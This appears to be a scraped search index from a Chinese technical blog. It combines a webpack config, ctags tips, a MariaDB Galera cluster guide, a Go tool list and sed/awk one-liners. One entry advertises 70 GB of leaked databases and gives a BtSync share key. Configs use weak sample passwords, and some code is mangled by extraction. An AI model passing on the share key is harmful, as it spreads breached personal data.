webpack.optimize.OccurrenceOrderPlugin(),\n        new webpack.HotModuleReplacementPlugin()\n    ]\n    // resolve: {\n    //     alias: {\n    //         huangImg: path.resolve(_dirname, 'src/image/')\n    //     }\n    // }\n}\n\nmodule.exports = config;\n/\n @Author: ignaciozhu\n @Date: 2017-05-03 16:32:21\n @Last Modified by: ignaciozhu\n @Last Modified time: 2017-06-02 11:50:06\n /\n//配置本地反向代理文件夹所在路径\nconst DIST = '../../../ya/clienthtml/branch/nginx-1.10.1/';\nconst path = require('path')\nconst webpack = require('webpack')\nconst HtmlWebpackPlugin = require(\"html-webpack-plugin\") //自动生成一个html 引入打包之后的js\nconst ExtractTextPlugin = require(\"extract-text-webpack-plugin\") //默认打包css 这些全部在js 里面  用这个可以分离出来 单独生成css文件  //生产环节会用到\nconst OpenBrowserPlugin = require('open-browser-webpack-plugin') //打包完成自动打开浏览器\nconst CopyWebpackPlugin = require('copy-webpack-plugin') //拷贝文件  当有第三方依赖可以copy到打包文件夹中\nconst autoprefixer = require('autoprefixer') //自动加前缀\nconst CptimizeCssAssetsPlugin = require('optimize-css-assets-webpack-plugin') //压缩css\nconst ImageminPlugin = require('imagemin-webpack-plugin').default //压缩图片\nconst { BundleAnalyzerPlugin } = require('webpack-bundle-analyzer') //生成打包图\nconst UglifyJSPlugin = require('uglifyjs-webpack-plugin'); //webpack3 单独分离出来了这个压缩的\n\nconst { host, devport } = require(\"./config\")\nconst { delhttp } = require('./server/utils/method.js')\n\nmodule.exports = (env) =  {\n  //env 是npm script 运行webpack时传进来的  判断是否是开发环境\n  const mode = (env \u0026\u0026 env.mode) || \"DEV\"\n\n  const options = {\n      //开发工具\n      devtool: mode === \"DEV\" ? \"source-map\" : false,\n\n      //开发服务器\n      devServer: {\n        contentBase: path.resolve(dirname, \"dist\"), //静态资源根目录\n        compress: true, //压缩\n        port: devport, //端口\n        host: delhttp(host),\n        hot: true, //热更新\n        inline: true, //iframe 模式\n        historyApiFallback: true, //浏览器 history\n        stats: { //统计\n          color: true, //输出有颜色的信息\n          errors: true, //显示错误信息\n          version: true, //显示版本号\n          warnings: true, //显示警告\n          progress: true, //显示进度,\n          timings: true, //显示时间\n        }\n      },\n\n      //入口\n      entry: mode === \"DEV\" ? [\n        \"react-hot-loader/patch\", //热更新\n        webpack-dev-server/client?${host}:${devport},\n        \"webpack/hot/only-dev-server\",\n        path.resolve(dirname, \"src/index.js\"),\n      ] : {\n        app: path.resolve(dirname, \"src/index.js\"),\n        // vendor:['react']\n      },\n\n      //打包输出\n      output: {\n        path: path.resolve(dirname, DIST + \"dist\"), ///myblog\n        filename: mode === \"DEV\" ? \"js/[name].js\" : \"./js/[name].[chunkhash:8].js\",\n        chunkFilename: mode === \"DEV\" ? \"js/[name]Chunk.js\" : \"./js/[name]Chunk.[chunkhash:8].js\",\n        publicPath: mode === \"DEV\" ? ${host}:${devport}/ : \"/\" //myblog/\n      },\n\n      //模块加载器\n      module: {\n        rules: [{\n          test: /\\.js[x]?$/,\n          use: [{\n            loader: \"babel-loader\"\n          }],\n          exclude: \"/nodemodules/\",\n          use: [\n            // {loader:'react-hot-loader'},\n            {\n              loader: \"babel-loader\",\n              options: {\n                //按需加载模块，antd...\n                plugins: [\n                  [\"import\", [{\n                    \"libraryName\": \"antd\",\n                    \"libraryDirectory\": \"lib\",\n                    \"style\": true\n                  }, {\n                    \"libraryName\": \"antd-mobile\",\n                    \"libraryDirectory\": \"component\",\n                  }, ]],\n                  // \"transform-decorators-legacy\",\n                  // \"transform-class-properties\"\n                ]\n              }\n            },\n          ],\n          include: [path.resolve(\"src\")] //只遍历src目录下的\n        }, {\n          test: /\\.less$/,\n          use: mode === \"DEV\" //开发环境 css打包到js中\n            ? [\n              { loader: \"style-loader\" }, //loader 倒序执行  先执行 less-laoder\n              { loader: \"css-loader\", options: { minimize: false, sourceMap: true } },\n              { loader: \"postcss-loader\" }, //自动加前缀\n              { loader: \"less-loader\", options: { sourceMap: true } }\n            ] : ExtractTextPlugin.extract({ //生产环境 把css单独分离出来\n              fallback: \"style-loader\",\n              use: [\n                \"css-loader\",\n                \"postcss-loader\", {\n                  loader: \"less-loader\",\n                  options: {\n                    sourceMap: false,\n                  },\n                },\n              ],\n            })\n        }, {\n          test: /\\.css$/,\n          use: mode === \"DEV\" ? [\n            { loader: \"style-loader\" }, //loader 倒序执行  先执行 less-laoder\n            { loader: \"css-loader\", options: { minimize: false, sourceMap: true } },\n            { loader: \"postcss-loader\" }\n          ] : ExtractTextPlugin.extract({\n            fallback: \"style-loader\",\n            use: [\n              \"css-loader\",\n              \"postcss-loader\", {\n                loader: \"less-loader\",\n                options: {\n                  sourceMap: false\n                },\n              },\n            ],\n          })\n        }, {\n          test: /\\.(jpg|jpeg|png|gif|cur|ico)$/,\n          use: [{\n            loader: 'file-loader',\n            options: {\n              name: \"images/name.[ext]\" //遇到图片  生成一个images文件夹  名字.后缀的图片\n            }\n          }]\n        }, {\n          test: /\\.(eot|ttf|svg|woff|woff2)$/,\n          use: [{\n            loader: \"file-loader\",\n            options: {\n              name: \"fonts/name.[ext]\",\n            },\n          }, ],\n        }, ]\n      },\n\n      //自动补全后缀\n      resolve: {\n        enforceExtension: false, //2.0 后 不能写 extensions :[\"\"]\n        extensions: ['.js', '.jsx', '.json'], //比如 test.js   可以写成 require('test')\n        alias: {\n          // Support React Native Web\n          // https://www.smashingmagazine.com/2016/08/a-glimpse-into-the-future-with-react-native-for-web/\n          'react-native': 'react-native-web',\n          components: path.resolve(dirname) + '/src/common/components',\n          / container: path.resolve(dirname, '..') + '/src/common/container',\n           images: path.resolve(dirname, '..') + '/src/common/images',\n           pages: path.resolve(dirname, '..') + '/src/common/pages',\n           utils: path.resolve(dirname, '..') + '/src/common/utils',\n           data: path.resolve(dirname, '..') + '/src/server/data',\n           actions: path.resolve(dirname, '..') + '/src/common/actions',\n           reducers: path.resolve(dirname, '..') + '/src/common/reducers',/\n        },\n        modules: [\n          path.resolve(\"src\"), //比如 src/app/components/xx  可以写成 app/components/xx\n          path.resolve(\".\"),\n          path.resolve(\"src/shared\"),\n          \"nodemodules\",\n        ],\n      },\n\n      //插件\n      plugins: []\n    }\n    //根据开发环境不同  concat 不同的插件\n  if (mode === \"DEV\") {\n    options.plugins = options.plugins.concat([\n      new webpack.NamedModulesPlugin(), //打印更具可读性模块名称在浏览器控制台\n      new webpack.NoEmitOnErrorsPlugin(), //错误不打断\n      new webpack.DefinePlugin({ //调试\n        DEBUG: true,\n      }),\n      new webpack.HotModuleReplacementPlugin(), //热加载插件  \n      /      new OpenBrowserPlugin({ //编译完成打开浏览器\n              url: ${host}:${devport}\n            })/\n    ])\n  } else {\n    options.plugins = options.plugins.concat([\n      // new BundleAnalyzerPlugin(),     //生成打包图\n      // //webpackv3.0新增 作用域提升 默认是闭包式打包 浏览器执行速度变慢\n      // //开启这个去掉模块的包裹函数,体积更小\n      // new webpack.optimize.ModuleConcatenationPlugin(),\n      new webpack.DefinePlugin({\n        \"process.env.NODEENV\": JSON.stringify(\"production\"),\n        DEBUG: false,\n      }),\n      new UglifyJSPlugin({ //压缩\n        output: {\n          comments: false //移除所有注释\n        },\n        compress: {\n          warnings: false\n        }\n      }),\n      new ExtractTextPlugin({ // 将打包文件中的css分离成一个单独的css文件\n        filename: 'css/app.[contenthash:8].css',\n        allChunks: true\n      }),\n      //[1]\n      //找到所有nodemodules的依赖包  分离出来\n      // /axios/ 没有用到的模块\n      new webpack.optimize.CommonsChunkPlugin({\n        name: \"app\",\n        async: \"common-in-lazy\",\n        children: true,\n        minChunks: ({ resource } = {}) =  (\n          resource \u0026\u0026\n          resource.includes('nodemodules') \u0026\u0026\n          /axios/.test(resource)\n        )\n      }),\n      // [2]\n      //找到模块次数使用两次的  分离出来\n      //单独打成used-twice.js 减少包的体积\n      /*\n       升级到 v2.6 貌似async不起作用  article admin detail 都使用了但是moment都打包进了对应的chunk文件\n       导致文件增大了600kb\n       经过github上的提问 各路大神的帮助下  解决了上面这个问题 需要设置name!!!!!!!!!!!\n       /\n      new webpack.optimize.CommonsChunkPlugin({\n        name: \"app\",\n        children: true,\n        async: 'used-twice',\n        minChunks: (module, count) =  (\n          count   = 2\n        ),\n      }),\n      //[3]\n      //1[3] 是按需加载 大幅减少打包js体积的关键\n      //遍历nodemodules目录 以.js结尾 一道vender chunk\n      //自动化分离第三方依赖\n      new webpack.optimize.CommonsChunkPlugin({\n        name: 'app',\n        filename: \"js/common.[chunkhash:8].js\",\n        minChunks: ({ resource }) =  (\n          resource \u0026\u0026\n          resource.indexOf('nodemodules')   = 0 \u0026\u0026\n          resource.match(/\\.js$/)\n        )\n      }),\n      new webpack.LoaderOptionsPlugin({ //laoder最小化\n        minimize: true\n      }),\n      //图片压缩没用。。。什么鬼\n      new ImageminPlugin({\n        // disable:false,\n        test: /\\.(jpe?g|png|gif|svg)$/i,\n        optipng: {\n          optimizationLevel: 7\n        }\n      }),\n      new CptimizeCssAssetsPlugin({ //压缩css  与 ExtractTextPlugin 配合使用\n        cssProcessor: require('cssnano'),\n        cssProcessorOptions: { discardComments: { removeAll: true } }, //移除所有注释\n        canPrint: true //是否向控制台打印消息\n      })\n    ])\n  }\n  options.plugins.push(\n    new HtmlWebpackPlugin({\n      title: \"西溪泊岸共享\",\n      filename: \"index.html\", //自动把打包的js文件引入进去\n      template: path.resolve(__dirname, \"src/index.html\"), //模板文件\n      hash: true, //添加hash码\n      inject: true //注射所有资源到 body元素的底部     \"head\" \"body\" true false  \"body\" == true\n    })\n  )\n  return options\n}\n`","tags":null},{"location":"//blog.pytool.com/cmd/2016-01-01 Linux命令 ctags","title":"ctags","text":"Exuberant Ctags中文手册\nctags的使用及相关参数介绍\n\nctags 可以识别哪些语言\nctags --list-languages\n查看默认哪些扩展名对应哪些语言：\nctags --list-maps\n ctags  为扩展名指定语法解析\nctags –R --langmap=c++:+.c \n 只扫描C++ 和java文件\n--languages=c++,java\n\n!ctags -R --sort=foldcase --file-scope=yes --langmap=c:+.h --languages=Asm,Make,C,C++,C\\#,Java,Python,sh,Vim,REXX,SQL --links=yes --c-kinds=+px --c++-kinds=+px --fields=+ainKsS --extra=+qf .\n\nctags -R -f .tags --languages=C,Java --langmap=C:+.h  --exclude=kernel\nctags -R -f .tags --languages=C,Java --langmap=C:+.h  --exclude=kernel --exclude=out","tags":null},{"location":"//blog.pytool.com/Post/数据库/MariaDB-Galera","title":"Linux之MariaDB集群","text":"通过上面的一系列测试，最后总结一下：\n\n在生产环境下应该避免使用大事务，不建议在高并发写入场景下使用Galera Cluster架构，会导致集群限流，从而引起整个集群hang住，出现生产故障。针对这种情况可以考虑主从，实现读写分离等手段。\n\n对数据一致性要求较高，并且数据写入不频繁，数据库容量也不大（50GB左右），网络状况良好的情况下，可以考虑使用Galera方案\n\nCentOS镜像解决方案\n\n创建并编辑MariaDB的源配置\n\n  sudo vi /etc/yum.repos.d/MariaDB.repo\n\n写入配置文件\n MariaDB 10.1 CentOS repository list - created 2016-12-31 08:44 UTC\nhttp://downloads.mariadb.org/mariadb/repositories/\n[mariadb]\nname = MariaDB\nbaseurl = https://mirrors.tuna.tsinghua.edu.cn/mariadb/yum/10.1/centos7-amd64\ngpgkey = https://mirrors.tuna.tsinghua.edu.cn/mariadb/yum//RPM-GPG-KEY-MariaDB\ngpgcheck = 1\n执行安装命令\n\nsudo yum install mariadb-server\n\n如果在用阿里云的服务器，可以将上述配置中的域名替换成\n    http://mirrors.aliyun.com/\n以上yum配置经修改后同样的适用于其他源，详细内容请往下看\nyum -y install MariaDB-server MariaDB-client  \n Ubuntu镜像\nsudo apt　install software-properties-common\n\nsudo apt-key adv --recv-keys --keyserver hkp://keyserver.ubuntu.com:80 0xF1656F24C74CD1D8\nsudo add-apt-repository 'deb [arch=amd64,i386,ppc64el] http://mirrors.tuna.tsinghua.edu.cn/mariadb/repo/10.2/ubuntu xenial main'\n\nsudo apt-get install mariadb-client\nsudo apt-get install mariadb-galera-server galera\n\n配置文件MariaDB及Galera\nsudo apt install xtrabackup\n /etc/my.cnf.d/galera.cnf\n[galera]\nwsrepon=ON\nwsrepprovider=/usr/lib64/galera/libgalerasmm.so\nwsrepclusteraddress=\"gcomm://192.168.1.112,192.168.1.113 \"\nbinlogformat=row\ndefaultstorageengine=InnoDB\ninnodbautoinclockmode=2\nbind-address=0.0.0.0\nwsrepclustername=\"GaleraCluster\"\nwsrepnodeaddress=\"192.168.1.112\"\nwsrepnodename=\"node1\"\nwsrepsstmethod=xtrabackup\nwsrepsstauth=root:command\n\n[galera]  \nwsrepcausalreads=ON                   节点应用完事务才返回查询请求  \nwsrepprovideroptions=\"gcache.size=4G\" #同步复制缓冲池  \nwsrepcertifynonPK=ON                  #为没有显式申明主键的表生成一个用于certificationtest的主键，默认为ON  \nlog-bin=/app/galera/mysql-bin          如果不接从库，注释掉  \nlogslaveupdates=1                    如果不接从库，注释掉  \nquerycachesize=0                      #关闭查询缓存  \nwsrepon=ON                             #开启全同步复制模式  \nwsrepprovider=/usr/lib64/galera/libgalerasmm.so\nwsrepclustername=MariaDB-Galera-Cluster  \nwsrepclusteraddress=\"gcomm://192.168.1.104,192.168.1.105,192.168.1.106\"\nwsrepnodename=mariadb-a03  \nwsrepnodeaddress=192.168.1.104  \nbinlogformat=row  \ndefaultstorageengine=InnoDB  \ninnodbautoinclockmode=2              #主键自增模式修改为交叉模式  \nwsrepslavethreads=8                   #开启并行复制线程，根据CPU核数设置  \ninnodbflushlogattrxcommit=0        #事务提交每隔1秒刷盘  \ninnodbbufferpoolsize=2G  \nwsrepsstmethod=rsync\n注意：\n此处wsrepclusteraddress为集群中所有节点或非自己的任意集群节点ip即可。\n不同节点的配置内容基本类似。\n要保证wsrepclustername必须一致，wsrepnodeaddress为本服务器地址。\nwsrepsstauth为本机MariaDB用户及密码。\nSST有三种全量拷贝方式：mysqldump、rsync和xtrabackup。SST的方法可以通过wsrepsstmethod这个参数来设置。\n\n4.CentOS 7下启动MariaDB-Galera集群\n\nCentOS 7使用了systemd作为它的初始化系统。不幸的是，systemd并不能传递命令行参数到相应的运行文件中。所以下面的命令是不能被执行的的:\n\nsystemctl start mariadb –wsrepnewcluster\n\nsystemctl:unrecognized option ‘-wsrepnewcluster’\n\n可以通过如下方案避免这样的问题：\n[root@Node1]# mysqldsafe -wsrep-new-cluster\n直接用mysql相应命令代入相关参数启动Node1及相关集群，此时新集群中只有Node1。\n[root@Node2]#systemctl start mariadb\n启动Node2上mariadb\nshow global stauts like ‘wsrep%’\n检查Node2是否接入集群\n[root@Node1]#ctrl+\\\n关闭Node1上的MariaDB，此时集群中只有Node2节点\n[root@Node1]# systemctl start mariadb\n在Node1上用systemd启动mariadb，此时Node1节点接入到Node2节点所在集群。\n\ngrant all on . to 'galera'@'localhost' identified by '123456';  \n\nMariaDB一个节点初始化安装（galera-node1）：\n\n     mysqlinstalldb --defaults-file=/etc/my.cnf.d/server.cnf --user=mysql  \n\n在 galera-node1 节点上通过bootstrap启动集群（第一次启动一定要使用--wsrep-new-cluster，再次启动就不需要）\n\n    mysqldsafe --defaults-file=/etc/my.cnf.d/server.cnf --user=mysql  --wsrep-new-cluster \u0026  \n\n在 galera-node1 节点上设置root密码以及安全设置（192.168.1.104,192.168.1.105,192.168.1.106）\n    /usr/bin/mysqlsecureinstallation  \n    或  \n    mysqlsecureinstallation  \n\n在galera-node2,galera-node3节点启动MariaDB：\n    mysqldsafe --defaults-file=/etc/my.cnf.d/server.cnf --user=mysql  \u0026  \n\n验证\nSHOW STATUS LIKE 'wsrepclustersize';  \nshow global status like 'ws%';  \n注释：\n\nwsrepclusterstatus为Primary，表示节点为主节点，正常读写。\n\nwsrepready为ON，表示集群正常运行。\n\nwsrepclustersize为3，表示集群有三个节点。\n\n 模拟脑裂后的处理\n下面模拟在网络抖动发生丢包的情况下，两个节点失联导致脑裂。首先，在192.168.1.105和192.168.1.106两个节点上分别执行：\n\niptables -A INPUT -p tcp --sport 4567 -j DROP\n\niptables -A INPUT -p tcp --dport 4567 -j DROP\n\n以上命令用来禁止wsrep全同步复制4567端口通信。\n\n然后我们在192.168.1.104节点查看：\n    MariaDB [(none)]  show global statuslike 'ws%';  \n    可以看到下面的几个值：  \n    wsrepclustersize    1  \n    wsrepclusterstatus  non-Primary  \n    wsrepready         OFF  \n\n    MariaDB [(none)]  use testdb;  \n    ERROR 1047 (08S01): WSREP has not yetprepared node for application use  \n\n    MariaDB [(none)]  select@@wsrepnodename;  \n    ERROR 1205 (HY000): Lock wait timeoutexceeded; try restarting transaction  \n\n现在已经出现脑裂的情况，并且集群无法执行任何命令。\n\n为了解决这个问题，可以执行：\n\nset global wsrepprovideroptions=\"pc.bootstrap=true\";\n\n通过这个命令来强制恢复出现脑裂的节点。\n\n避免脏读\n\nGalera Cluster不是真正意义上的全同步复制，存在延迟。我们可以在一个节点上面执行FLUSH TABLES WITH READ LOCK;全局读锁。\n\n然后在其他节点执行写操作，观察延迟情况。\n\n比如我们在192.168.1.106节点执行全局读锁设置：","tags":null},{"location":"//blog.pytool.com/tool/2016-10-22 BTsync","title":"BTsync","text":"最近几年网上泄露、流传出来的各种数据库，已收集有70G+\n\nBtSync密钥：BHMIILA2HRJ5ZG6FN6KE7YUKBZMQOFCOA","tags":null},{"location":"//blog.pytool.com/Post/Go/2016-10-04 golang","title":"golang","text":"---\n编译成夸平台版 CGOENABLED=0\nCGOENABLED=0 GOOS=linux go build -a -ldflags '-s -w'\nCGOENABLED=0 go build -a -installsuffix cgo\n go librarys\n  https://golang.org/pkg/\n  http://go-search.org/\nGo 语言文本处理库 Prose Go\n\n 项目精选\n[monexec] Go 语言实现的 supervisor monexec\nlantern\n小米监控系统 OpenFalcon\n分布式文件系统 IPFS\nGo 爬虫软件 Pholcus幽灵蛛\nOPMS=OA+PMS，项目+办公管理\nGo的角色访问控制 goRBAC \n个人云笔记 leanote\n验证码服务 captcha \n觅链[milnk]Reddit\ngrep 开源替代\n知网(CNKI)文献下载工具\nhttp抓包代理程序\n\nRobotGo v0.10.0，Golang 跨平台 GUI 自动化系统\n\n一键生成IOS图标\n远程服务器监控工具 rtop\notunnel  对称的安全隧道工具 \n内网穿透工具 frp\n内网穿透 自定义域名 ngrok反向代理\np2p端口映射工具 dog-tunnel\nSocket 网络隧道 qTunnel曲径\nbat\nMmock 服务\n边看边练 github.com/b3log/wide\nMigrations for MySQL 数据迁移工具 gh-ost\n ETL\nhttps://github.com/compose/transporter\n\n并行parallel SSH工具 orgalorg omnitool remote execute\ngo get github.com/reconquest/orgalorg\ngo get github.com/jmsdnns/omnitool\ngo get -u -v github.com/artyom/rex\n\n 定时任务 gocron\ngo get -d github.com/ouqiang/gocron\n\ngrep\nA fast and powerful alternative to grep https://sift-tool.org\ngo get github.com/svent/sift\n\n 网路诊断mylg\nNetwork Diagnostic Tool http://mylg.io\n\nplik: Plik is a scalable \u0026 friendly temporary file upload system ( wetransfer like ) in golang.\nwebhook 创建一个RESTAPI 当被触发执行命令\n\ngo get -u github.com/astaxie/bat\n\ndogo当源文件发生改变时, 自动重新编译并运行(或重启). 适用于开发服务端程序时快速调试\ngo get github.com/liudng/dogo\n\ntraefik api 反向代理\n\nTyk Open Source API Gateway\n服务\n\ngo get -d github.com/fiorix/freegeoip\n\nvault 密码服务\n\nwebsocketd\n\nredis web 客户端  github.com/prettyyjnic/redisSky\nkingshard作为MySQL代理\n\n mysql 表同步工具\ngithub.com/hidu/mysql-schema-sync\nssh 破解\ngo get github.com/ncsa/ssh-auditor\n\n 基于文本密度抽取\ngo get -u -v github.com/sundy-li/html2article\n库\n valid https://github.com/asaskevich/govalidator\n\nxcrawl\ngo get github.com/kyokomi/xcrawl\n\nminidoc  SmartWiki 文档管理系统\ngo get github.com/lifei6671/mindoc\n\n 测试\nHoverfly github.com/SpectoLabs/hoverfly\n\ngo\n install\n  curl -O https://storage.googleapis.com/golang/go1.9.2.linux-amd64.tar.gz\n  sudo rm -rf /usr/local/go \u0026\u0026  sudo tar -zxf go1.9.2.linux-amd64.tar.gz -C /usr/local \n环境变量配置\nGOROOT: golang可执行程序本身的路径\nGOPATH: 当有多个GOPATH时，默认会将go get的内容放在第一个目录下[golang库的路径]\n  Windows是[; 分号 semicolon-separated]\n  Linux系统是[: 冒号 colon-separated]\n  export GO15VENDOREXPERIMENT=1\n  export GOROOT=/usr/local/go\n  export GOPATH=$HOME/go\n  export PATH=$PATH:$GOROOT/bin:$GOPATH/bin\natom go-plus\ngo get -u golang.org/x/tools/cmd/goimports\ngo get -u golang.org/x/tools/cmd/gorename\ngo get -u github.com/sqs/goreturns\ngo get -u github.com/nsf/gocode\ngo get -u github.com/alecthomas/gometalinter\ngo get -u github.com/zmb3/gogetdoc\ngo get -u github.com/rogpeppe/godef\ngo get -u golang.org/x/tools/cmd/guru\n\nGo命令详解\ngo env 查看GO变量\n\ngo build\n    如果是普通包，当你执行go build命令后，不会产生任何文件。\n    如果是main包，当只执行go build命令后，会在当前目录下生成一个可执行文件。\n    如果需要在$GOPATH/bin木下生成相应的exe文件，需要执行go install 或者使用 go build -o 路径/a.exe。\ngo install 命令在内部实际上分成了两步操作：第一步是生成结果文件(可执行文件或者.a包)，第二步会把编译好的结果移到 $GOPATH/pkg 或者 $GOPATH/bin。\ngo get 命令本质上可以理解为：首先通过源码工具clone代码到src目录，然后执行go install; go get = git clone + go install\n  -insecure 使用http代理时\n  -d 只下载不安装\n  -f 只有在你包含了-u参数的时候才有效，不让-u去验证import中的每一个都已经获取了，这对于本地fork的包特别有用\n  -fix 在获取源码之后先运行fix，而后再进行编译和安装。\n  -t 同时也下载需要为运行测试所需要的包\n  -u 强制使用网络去更新包和它的依赖包 默认情况下，该命令只会从网络上下载本地不存在的代码包，而不会更新已有的代码包。 |\n  -v 显示执行的命令\ngo test 命令，会自动读取源码目录下面名为* test.go的文件，生成并运行测试用的可执行文件。输出的信息类似\n\n解决go get无法获取golang.org的包的问题 x509 错误\nwhile if I add --insecure option, it will be ok\n\n你首先得有个能够(尼)翻(玛)墙的代理地址，我这里用的是Lantern，他的http代理端口是8787。\n\n设置代理，需要添加httpproxy等环境变量\n\n修改~/.bashrc添加以下配置后，在source ~/.bashrc就可以了：\nexport httpproxy=http://localhost:8787  \nexport httpsproxy=$httpproxy  \nexport ftpproxy=$httpproxy  \nexport rsyncproxy=$httpproxy  \nexport noproxy=\"localhost,127.0.0.1,localaddress,.localdomain.com\"  \n此外git也需要配置代理：\n\ngit config --global https.proxy http://127.0.0.1:8787  \ngit config --global https.proxy https://127.0.0.1:8787  \n\n查看已经设置的值：git config http.proxy\n\ngo get --insecure\n参数说明：\n--insecure  \n-d 只下载不安装 相当有 git clone\n-f 只有在你包含了-u参数的时候才有效，不让-u去验证import中的每一个都已经获取了，这对于本地fork的包特别有用\n-fix 在获取源码之后先运行fix，然后再去做其他的事情\n-t 同时也下载需要为运行测试所需要的包\n-u 强制使用网络去更新包和它的依赖包\n-v 显示执行的命令\n\n我们使用go get下载包时，最好使用-u -v参数，-v可以参看下载的其他依赖包，便于我们定位是哪个包出的问题，如：\n\ngo get -v -u github.com/kataras/iris  \n\ngo get -v -u -insecure gopkg.in/yaml.v2\n\n 导入证书\nActually I have already imported related certs into /etc/ssl/certs/ca-certificates.crt before submitting this issue, and unfortunately without luck. Below is the steps what I do:\n\n    open firefox, and use the same proxy above: http://my-corporate-proxy:8080\n    navigate to \"https://gopkg.in/yaml.v2\", click upper left lock icon, and open \"View Certificate\"\n    export the cert to /usr/local/share/ca-certificates\n    run update-ca-certificates, and double check that /etc/ssl/certs/ca-certificates.crt does include this new cert\n\nSo seems go get doesn't recognise local certs? and still reports \"certificate signed by unknown authority\".\n\n在中国网络环境下获取Golang.org上的Golang Packages\n方法1：\ngolang.org被屏蔽了，直接访问不了，解决办法如下：\n在 http://ping.eu/ping/ 上ping一下golang.org，获取到IP\n方法2：\n做下软连接把github文件夹下面的映射到golang.org下\nln -sf ~/go/src/github.com/golang ~/go/src/golang.org/x\nln -sf $GOPATH/src/github.com/golang $GOPATH/src/golang.org/x\nln -sf $GOPATH//src/github.com/go-gcfg/gcfg/gcfg $GOPATH/src/code.google.com/p/gcfg\nln -sf $GOPATH//src/github.com/go-gcfg/gcfg/gcfg $GOPATH/src/gopkg.in/gcfg.v1\ncode.google.com/p/gcfg\ngo get -d github.com/golang/sys\ngo get -d github.com/golang/tools\ngo get -d github.com/golang/net\ngo get -d github.com/golang/crypto\ngo get -d github.com/golang/mobile\ngo get -d github.com/golang/tour\ngo get -d github.com/golang/playground\ngo get -d github.com/golang/text\ngo get -d github.com/golang/image\ngo get -d github.com/golang/exp\ngo get -d github.com/golang/debug\ngo get -d github.com/golang/build\ngo get -d github.com/golang/time\ngo get -d github.com/golang/arch\ngo get -d github.com/golang/sync\ngo get -d github.com/golang/review\n\n解决方案\n\n    方案 A: 使用github 上的镜像\n\n        获取Golang Package在github镜像上的路径:\n        golang.org/x/PATHTOPACKAGE —  github.com/golang/PATHTO_PACKAGE.\n\n               // Ex:\n               golang.org/x/net/context --  github.com/golang/net/context","tags":null},{"location":"//blog.pytool.com/cmd/2016-01-01 Linux命令 sed\u0026awk","title":"SED单行脚本快速参考[同时包含awk实现]","text":"文本间隔：\n\n在每一行后面增加一空行\n\nsed G\nawk '{printf(\"%s\\n\\n\",$0)}'\n\n 将原来的所有空行删除并在每一行后面增加一空行。\n这样在输出的文本中每一行后面将有且只有一空行。\n\nsed '/^$/d;G'\nawk '!/^$/{printf(\"%s\\n\\n\",$0)}'\n\n 在每一行后面增加两行空行\n\nsed 'G;G'\nawk '{printf(\"%s\\n\\n\\n\",$0)}'\n\n将第一个脚本所产生的所有空行删除（即删除所有偶数行）\n\nsed 'n;d'\nawk '{f=!f;if(f)print $0}'\n\n 在匹配式样“regex”的行之前插入一空行\n\nsed '/regex/{x;p;x;}'\nawk '{if(/regex/)printf(\"\\n%s\\n\",$0);else print $0}'\n\n在匹配式样“regex”的行之后插入一空行\n\nsed '/regex/G'\nawk '{if(/regex/)printf(\"%s\\n\\n\",$0);else print $0}'\n\n 在匹配式样“regex”的行之前和之后各插入一空行\n\nsed '/regex/{x;p;x;G;}'\nawk '{if(/regex/)printf(\"\\n%s\\n\\n\",$0);else print $0}'\n\n编号：\n\n为文件中的每一行进行编号（简单的左对齐方式）。这里使用了“制表符”\n （tab，见本文末尾关于’\\t’的用法的描述）而不是空格来对齐边缘。\n\nsed = filename | sed 'N;s/\\n/\\t/'\nawk '{i++;printf(\"%d\\t%s\\n\",i,$0)}'\n\n对文件中的所有行编号（行号在左，文字右端对齐）。\n\nsed = filename | sed 'N; s/^/     /; s/ \\(.\\{6,\\}\\)\\n/\\1  /'\nawk '{i++;printf(\"%6d  %s\\n\",i,$0)}'\n\n 对文件中的所有行编号，但只显示非空白行的行号。\n\nsed '/./=' filename | sed '/./N; s/\\n/ /'\nawk '{i++;if(!/^$/)printf(\"%d %s\\n\",i,$0);else print}'\n\n计算行数 （模拟 “wc -l”）\n\nsed -n '$='\nawk '{i++}END{print i}'\n\n文本转换和替代：\n\n Unix环境：转换DOS的新行符（CR/LF）为Unix格式。\n\nsed 's/.$//'                     # 假设所有行以CR/LF结束\nsed 's/^M$//'                    # 在bash/tcsh中，将按Ctrl-M改为按Ctrl-V\nsed 's/\\x0D$//'                  # ssed、gsed 3.02.80，及更高版本\nawk '{sub(/\\x0D$/,\"\");print $0}'\n\nUnix环境：转换Unix的新行符（LF）为DOS格式。\n\nsed \"s/$/echo -e \\\\\\r/\"         在ksh下所使用的命令\nsed 's/$'\"/echo \\\\\\r/\"         # 在bash下所使用的命令\nsed \"s/$/echo \\\\\\r/\"           # 在zsh下所使用的命令\nsed 's/$/\\r/'                    # gsed 3.02.80 及更高版本\nawk '{printf(\"%s\\r\\n\",$0)}'\n\nDOS环境：转换Unix新行符（LF）为DOS格式。\n\nsed \"s/$//\"                       方法 1\nsed -n p                         # 方法 2\n\nDOS环境：转换DOS新行符（CR/LF）为Unix格式。\n 下面的脚本只对UnxUtils sed 4.0.7 及更高版本有效。要识别UnxUtils版本的\nsed可以通过其特有的“–text”选项。你可以使用帮助选项（“–help”）看\n 其中有无一个“–text”项以此来判断所使用的是否是UnxUtils版本。其它DOS\n版本的的sed则无法进行这一转换。但可以用“tr”来实现这一转换。\n\nsed \"s/\\r//\" infile   outfile      UnxUtils sed v4.0.7 或更高版本\ntr -d \\r infile outfile        # GNU tr 1.22 或更高版本\n\n将每一行前导的“空白字符”（空格，制表符）删除\n 使之左对齐\n\nsed 's/^[ \\t]//'                # 见本文末尾关于'\\t'用法的描述\nawk '{sub(/^[ \\t]+/,\"\");print $0}'\n\n将每一行拖尾的“空白字符”（空格，制表符）删除\n\nsed 's/[ \\t]$//'                 见本文末尾关于'\\t'用法的描述\nawk '{sub(/[ \\t]+$/,\"\");print $0}'\n\n将每一行中的前导和拖尾的空白字符删除\n\nsed 's/^[ \\t]//;s/[ \\t]$//'\nawk '{sub(/^[ \\t]+/,\"\");sub(/[ \\t]+$/,\"\");print $0}'\n\n 在每一行开头处插入5个空格（使全文向右移动5个字符的位置）\n\nsed 's/^/     /'\nawk '{printf(\"     %s\\n\",$0)}'\n\n以79个字符为宽度，将所有文本右对齐\n 78个字符外加最后的一个空格\n\nsed -e :a -e 's/^.\\{1,78\\}$/ \u0026/;ta'\nawk '{printf(\"%79s\\n\",$0)}'\n\n以79个字符为宽度，使所有文本居中。在方法1中，为了让文本居中每一行的前\n 头和后头都填充了空格。 在方法2中，在居中文本的过程中只在文本的前面填充\n空格，并且最终这些空格将有一半会被删除。此外每一行的后头并未填充空格。\n\nsed  -e :a -e 's/^.\\{1,77\\}$/ \u0026 /;ta'                      